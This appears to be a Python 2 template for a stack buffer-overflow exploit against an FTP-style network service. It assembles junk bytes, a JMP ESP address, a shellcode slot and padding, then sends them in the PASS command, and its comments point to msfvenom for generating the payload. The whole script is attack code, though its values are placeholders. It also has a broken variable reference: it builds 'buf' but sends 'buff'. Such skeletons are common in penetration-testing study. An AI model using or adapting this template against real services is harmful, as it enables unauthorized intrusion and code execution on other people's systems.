#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

##HOST OPTIONS##
HOST = "10.10.10.10"
PORT = 1111

###Required Buffer Sections###

payload = ("Shellcodehere")

junk = "A"*10

jmp_esp = "\x00\x00\x00\x00"

#nop_slide = "\x90"*1
#Use msfvenom encode the Nops directly into the payload. You can eliminate the need for padding with this too Just create the payload the exact size of the required space. Using nops for padding.

padding = "C"*10


#buff example: junk + jmp_esp + nop_slide + payload + padding

buf = junk + jmp_esp + payload + padding



###Send the buf###


#This needs to be adjusted depending on the application response. 

try:
	print "[+] Sending Exploit..."
	s.connect((HOST, PORT))
	data = s.recv(1024)
	s.send('USER' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buff + '\r\n')
	print "\n[+] Exploit Complete."
except:
	print "[-] Could not connect to target."	
